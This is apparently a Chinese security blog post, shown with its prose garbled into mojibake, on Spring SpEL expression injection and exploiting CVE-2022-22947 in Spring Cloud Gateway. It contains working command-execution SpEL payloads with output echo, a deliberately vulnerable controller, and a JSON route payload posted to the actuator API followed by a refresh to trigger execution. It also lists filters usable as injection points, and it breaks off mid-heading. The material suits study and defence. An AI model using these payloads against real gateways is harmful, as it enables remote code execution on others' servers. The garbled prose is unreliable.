        <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« çš„ä¸»è¦ç›®çš„æ˜¯å­¦ä¹ ä¸€ä¸‹spelè¡¨è¾¾å¼æ³¨å…¥å’Œå“¥æ–¯æ‹‰å†…å­˜é©¬æ³¨å…¥ï¼Œè¿˜æœ‰ç¥å™¨java-object-searcherçš„ä½¿ç”¨</p><h1 id="SPELè¡¨è¾¾å¼æ³¨å…¥"><a href="#SPELè¡¨è¾¾å¼æ³¨å…¥" class="headerlink" title="SPELè¡¨è¾¾å¼æ³¨å…¥"></a>SPELè¡¨è¾¾å¼æ³¨å…¥</h1><ul><li>spelæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ï¼Œä»¥APIæ¥å£çš„å½¢å¼åˆ›å»ºï¼Œæ‰€ä»¥å¯ä»¥é›†æˆåˆ°å…¶ä»–åº”ç”¨ç¨‹åºå’Œæ¡†æ¶ä¸­</li></ul><h3 id="spelæ¥å£"><a href="#spelæ¥å£" class="headerlink" title="spelæ¥å£"></a>spelæ¥å£</h3><ul><li>ExpressionParseræ¥å£ï¼šè§£æå™¨</li></ul><blockquote><p>ExpressionParseræ¥å£ä¸‹çš„parseExpression()æ–¹æ³•å°†å­—ç¬¦ä¸²è¡¨è¾¾å¼è½¬åŒ–ä¸ºExpressionå¯¹è±¡</p><ul><li>parseExpression()æ¥æ”¶å‚æ•°ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expression <span class="title function_">parseExpression</span><span class="params">(String expressionString, ParserContext context)</span>;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­parserContextå®šä¹‰äº†å­—ç¬¦ä¸²è¡¨è¾¾å¼æ˜¯å¦ä¸ºæ¨¡æ¿ï¼Œå’Œæ¨¡æ¿å¼€å§‹ä¸ç»“æŸå­—ç¬¦</p></blockquote><p>æˆ‘ä»¬ç»å¸¸çœ‹è§çš„spelè¡¨è¾¾å¼ä»¥<code>#&#123;xxx&#125;</code>çš„å½¢å¼å‡ºç°ï¼Œä»–çš„parserContextå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ParserContext</span> <span class="variable">parserContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserContext</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getExpressionPrefix</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;#&#123;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getExpressionSuffix</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><ul><li>EvaluationContextæ¥å£ï¼šè¡¨ç¤ºä¸Šä¸‹æ–‡ç¯å¢ƒã€‚ä»¥SpelExpressionå®ç°ï¼Œæä¾›getValueå’ŒsetValueæ“ä½œå¯¹è±¡å€¼</li></ul><h3 id="spelè¯­æ³•"><a href="#spelè¯­æ³•" class="headerlink" title="spelè¯­æ³•"></a>spelè¯­æ³•</h3><ul><li>T(å…¨é™å®šå)è¡¨ç¤ºjava.lang.Classï¼ŒRCEçš„å…³é”®ï¼Œå¦‚ä¸‹ä½¿ç”¨<code>T(java.lang.Runtime)</code>è·å–äº†ç±»ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥ä½¿ç”¨ç±»ä¸‹çš„æ–¹æ³•</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>å’Œjavaä¸€æ ·çš„å…³é”®å­—ï¼šnewè¿›è¡Œç±»å®ä¾‹åŒ–ï¼Œinstanceofåˆ¤æ–­type</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&quot;calc.exe).start()</span></span><br></pre></td></tr></table></figure><ul><li>å˜é‡å®šä¹‰å’Œå¼•ç”¨ï¼š<ul><li>å˜é‡å®šä¹‰ï¼š<code>EvaluationContextçš„setVariable(name,value)</code></li><li>å¼•ç”¨ï¼š<code>#name</code>ï¼Œè¿˜æ”¯æŒ<code>#this</code>å’Œ<code>#root</code></li></ul></li></ul><h3 id="spel-Controller"><a href="#spel-Controller" class="headerlink" title="spel Controller"></a>spel Controller</h3><p>pom.xmlä¸­æ·»åŠ ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªcontrolleræ¥æ”¶å­—ç¬¦å‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">spel</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/spel&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">spel</span><span class="params">(String input)</span>&#123;</span><br><span class="line">        <span class="type">SpelExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(input);</span><br><span class="line">        <span class="keyword">return</span> expression.getValue().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨spelExpressionParseræ¥å£åˆ›å»ºè§£æå™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SpelExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br></pre></td></tr></table></figure><p>æŒ‡å®šExpressionParser#parseExpression()æ¥è§£æè¡¨è¾¾å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(input);</span><br></pre></td></tr></table></figure><p>getValueæ ¹æ®ä¸Šä¸‹æ–‡è·å¾—è¡¨è¾¾å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expression.getValue().toString();</span><br></pre></td></tr></table></figure><p>å¦‚æœå‘è¯¥Controller HTTPä¼ å‚ï¼Œå‚æ•°åä¸ºInputï¼Œå°±èƒ½è¿›è¡Œspelè§£æ</p><h2 id="spelå›æ˜¾"><a href="#spelå›æ˜¾" class="headerlink" title="spelå›æ˜¾"></a>spelå›æ˜¾</h2><ol><li><p><code>commons-io</code>ç»„ä»¶å›æ˜¾ã€‚ä½†æ˜¯éœ€è¦æœåŠ¡å™¨å­˜åœ¨è¯¥ç»„ä»¶ï¼Œä¸€èˆ¬éƒ½æ²¡æœ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(org.apache.commons.io.IOUtils).toString(payload).getInputStream())</span><br></pre></td></tr></table></figure></li><li><p>jdk&gt;&#x3D;9æ—¶ä½¿ç”¨JShell</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(<span class="string">&quot;jdk.jshell.JShell&quot;</span>,<span class="literal">true</span>).Methods[<span class="number">6</span>].invoke(<span class="literal">null</span>,&#123;&#125;).eval(<span class="string">&#x27;java payload&#x27;</span>).toString()</span><br></pre></td></tr></table></figure><ol start="3"><li>jdkåŸç”Ÿç±»BufferedReader</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>( <span class="string">&quot;whoami&quot;</span>).start().getInputStream(), <span class="string">&quot;gbk&quot;</span>)).readLine()</span><br></pre></td></tr></table></figure><ol start="4"><li>scanner</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&quot;ls&quot;</span>).start().getInputStream(), <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;asfsfsdfsf&quot;</span>).next()</span><br></pre></td></tr></table></figure><p>useDelimiterä¸ºåˆ†éš”ç¬¦</p><h1 id="Spring-Cloud-GateWay-CVE-2022-22947"><a href="#Spring-Cloud-GateWay-CVE-2022-22947" class="headerlink" title="Spring Cloud GateWay CVE-2022-22947"></a>Spring Cloud GateWay CVE-2022-22947</h1><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p>Spring Cloud GateWayç‰ˆæœ¬ï¼š3.1.0&amp;&lt;&#x3D;3.0.0-3.0.6</p><p>æºç ï¼š<a href="https://github.com/spring-cloud/spring-cloud-gateway/releases/tag/v3.1.0">https://github.com/spring-cloud/spring-cloud-gateway/releases/tag/v3.1.0</a></p><p>ideaæ‰“å¼€å°±èƒ½åˆ†æäº†</p><p>åœ¨<code>shortcutConfigurable#getValue</code>ä¸­ï¼Œ<code>#&#123;&#125;</code>åŒ…ä½çš„è¿›è¡Œspelè§£æï¼Œè¿™å°±æ˜¯é“¾æœ€åçš„åœ°æ–¹ï¼Œæ§åˆ¶entryValueå³å¯å®ç°spelæ³¨å…¥</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320113908131.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320113908131.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨shortcutTypeå¤„ä½¿ç”¨äº†getValue</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320115246762.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320115246762.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320115309246.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320115309246.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”±äºæ˜¯åœ¨shortcutTypeä¸­çš„normalizeä¸­è°ƒç”¨çš„getValue()ï¼Œæ‰€ä»¥æ‰¾ä¹Ÿè¦æ‰¾è°ƒç”¨äº†<code>shortcutType().normalize()</code>æ–¹æ³•çš„ç±»ï¼ŒConfigurationServiceå°±ç¬¦åˆ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328160155438.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328160155438.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328162047694.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328162047694.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸Šæ–‡çš„<code>entry.getValue()</code>ï¼Œentryå³ä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªMapã€‚è¿™é‡Œæ§åˆ¶<code>this.properties</code>ä¸ºæ¶æ„mapå°±èƒ½æ§åˆ¶spelè¡¨è¾¾å¼</p><p>åœ¨<code>bind()</code>æ–¹æ³•ä¸­è§¦å‘äº†<code>normalizeProperties()</code>æ–¹æ³•ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328162610459.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328162610459.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨<code>RouteDefinitionRouteLocator#lookup()</code>æ–¹æ³•ä¸­å¯¹propertiesè¿›è¡Œäº†è®¾ç½®ï¼Œç„¶åè°ƒç”¨äº†bind()</p><p>propertiesçš„å€¼ä¸º<code>predicate.getArgs()</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328163322901.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328163322901.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨combinePredicatesä¸­å®šä¹‰äº†predicateçš„å€¼ï¼Œä¸routeDefinitionæœ‰å…³</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328172604495.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328172604495.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨<code>convertToRoute()</code>ä¸­è°ƒç”¨äº†combinePredicates()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328172853204.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328172853204.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è€Œåœ¨è·¯ç”±åˆå§‹åŒ–æ—¶è§¦å‘convertToRoute()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CacheingRouteLocator#onApplicationEvent()-&gt;</span><br><span class="line">    CachingRouteLocator#fetch()-&gt;</span><br><span class="line">    CompositeRouteLocator#getRoutes()-&gt;</span><br><span class="line">    RouteDefinitionRouteLocator#getRoutes()-&gt;</span><br><span class="line">    RouteDefinitionRouteLocator#convertToRoute()</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>åœ¨å®˜æ–¹æ–‡æ¡£<a href="https://docs.spring.io/spring-cloud-gateway/docs/3.1.0/reference/html/#actuator-api%E4%B8%AD%EF%BC%8C%E6%8F%90%E4%BE%9B%E4%BA%86json%E5%8F%91%E9%80%81%E8%B7%AF%E7%94%B1%E8%AF%B7%E6%B1%82%E5%86%85%E5%AE%B9">https://docs.spring.io/spring-cloud-gateway/docs/3.1.0/reference/html/#actuator-apiä¸­ï¼Œæä¾›äº†jsonå‘é€è·¯ç”±è¯·æ±‚å†…å®¹</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328164518702.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328164518702.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>Actuator APIæä¾›äº†Restæ·»åŠ è·¯ç”±çš„æ–¹å¼:</p><blockquote><p>è¦åˆ›å»ºä¸€ä¸ªè·¯ç”±ï¼Œè¯·å‘&#x2F;gateway&#x2F;routes&#x2F;{id_route_to_create}å‘å‡ºä¸€ä¸ªPOSTè¯·æ±‚ï¼Œè¯¥è¯·æ±‚åŒ…å«ä¸€ä¸ªæŒ‡å®šè·¯ç”±å­—æ®µçš„JSONä¸»ä½“ï¼ˆè§æ£€ç´¢æŸä¸ªç‰¹å®šè·¯ç”±çš„ä¿¡æ¯ï¼‰ã€‚è¦åˆ é™¤ä¸€ä¸ªè·¯ç”±ï¼Œè¯·å‘&#x2F;gateway&#x2F;routes&#x2F;{id_route_to_delete}å‘å‡ºä¸€ä¸ªDELETEè¯·æ±‚ã€‚</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328163753075.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328163753075.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>http://xxx/actuator/gateway/routes/&#123;xxx&#125;</code>æ·»åŠ è·¯ç”±</p><p>ä¹Ÿå°±æ˜¯å¯ä»¥å‘<code>http://xxx/actuator/gateway/routes/godown</code>å¦‚ä¸‹payloadè¿›è¡Œæ³¨å…¥</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;godown&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Path&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;_genkey_0&quot;</span><span class="punctuation">:</span><span class="string">&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.uri-destination.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºå®Œä¹‹åå‘<code>http://xxx/actuator/gateway/refresh</code>å‘é€è¯·æ±‚å³å¯åˆ·æ–°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328165326591.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328165326591.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…¶å®æ·»åŠ çš„è¿™éƒ¨åˆ†è·¯ç”±å¯¹åº”ç€é…ç½®æ–‡ä»¶ä¸­çš„routeéƒ¨åˆ†ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328165708684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328165708684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ³¨æ„åœ¨åˆ›å»ºè·¯ç”±çš„æ—¶å€™æŠŠcontent-typeæ”¹ä¸ºapplication&#x2F;json</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403194802519.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403194802519.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="æ‹“å±•é“¾"><a href="#æ‹“å±•é“¾" class="headerlink" title="æ‹“å±•é“¾"></a>æ‹“å±•é“¾</h2><p>ä¸Šæ–‡payloadé‡Œçš„å…¶ä»–å‚æ•°æœ‰æ²¡æœ‰ç”¨ï¼Ÿnameä¸ºä»€ä¹ˆè¦æ˜¯Pathï¼Ÿ</p><p>å€Ÿç”¨å¥‡å®‰ä¿¡çš„ä¸€å¼ è°ƒç”¨æ ˆå›¾ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328184956808.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328184956808.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨RouteDefinitionRouteLocator#convertToRoute()æ–¹æ³•å¤„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328185532235.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328185532235.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é™¤äº†ä¼šè°ƒç”¨combinePredicatesï¼Œè¿˜ä¼šè°ƒç”¨getFiltersæ¥è§¦å‘loadGatewayFiltersè¿›è¡Œbind</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328213727298.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328213727298.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥åœ¨filterså¤„æ³¨å…¥ä¹Ÿæ˜¯å¯ä»¥çš„</p><ul><li>å¥‡å®‰ä¿¡æ”»é˜²å®éªŒå®¤å¯¹å„ç§è¿‡æ»¤å™¨è¿›è¡Œäº†å®éªŒï¼Œäº‹å®è¯æ˜æ‰€æœ‰è¿‡æ»¤å™¨éƒ½å¯ä»¥ï¼š<a href="https://forum.butian.net/share/1410">https://forum.butian.net/share/1410</a></li></ul><blockquote><p>è¿‡æ»¤å™¨åç§°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">AddRequestHeader</span><br><span class="line">MapRequestHeader</span><br><span class="line">AddRequestParameter</span><br><span class="line">AddResponseHeader</span><br><span class="line">ModifyRequestBody</span><br><span class="line">DedupeResponseHeader</span><br><span class="line">ModifyResponseBody</span><br><span class="line">CacheRequestBody</span><br><span class="line">PrefixPath</span><br><span class="line">PreserveHostHeader</span><br><span class="line">RedirectTo</span><br><span class="line">RemoveRequestHeader</span><br><span class="line">RemoveRequestParameter</span><br><span class="line">RemoveResponseHeader</span><br><span class="line">RewritePath</span><br><span class="line">Retry</span><br><span class="line">SetPath</span><br><span class="line">SecureHeaders</span><br><span class="line">SetRequestHeader</span><br><span class="line">SetRequestHostHeader</span><br><span class="line">SetResponseHeader</span><br><span class="line">RewriteResponseHeader</span><br><span class="line">RewriteLocationResponseHeader</span><br><span class="line">SetStatus</span><br><span class="line">SaveSession</span><br><span class="line">StripPrefix</span><br><span class="line">RequestHeaderToRequestUri</span><br><span class="line">RequestSize</span><br><span class="line">RequestHeaderSize</span><br></pre></td></tr></table></figure></blockquote><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;first_route&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retry&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> </span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;payload&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.uri-destination.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹filters.nameä¸ºä»»æ„åˆæ³•è¿‡æ»¤å™¨åï¼Œpayloadå¤„æ”¹ä¸ºspelè¡¨è¾¾å¼</p><p>åŒç†ï¼Œpredicatesé‡Œçš„nameï¼Œæˆ‘ä»¬ä¹‹å‰ç”¨çš„Path</p><p>å®é™…ä¸Šä¸‹åˆ—predicateséƒ½èƒ½ç”¨ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230329213203262.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230329213203262.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="å›æ˜¾"><a href="#å›æ˜¾" class="headerlink" 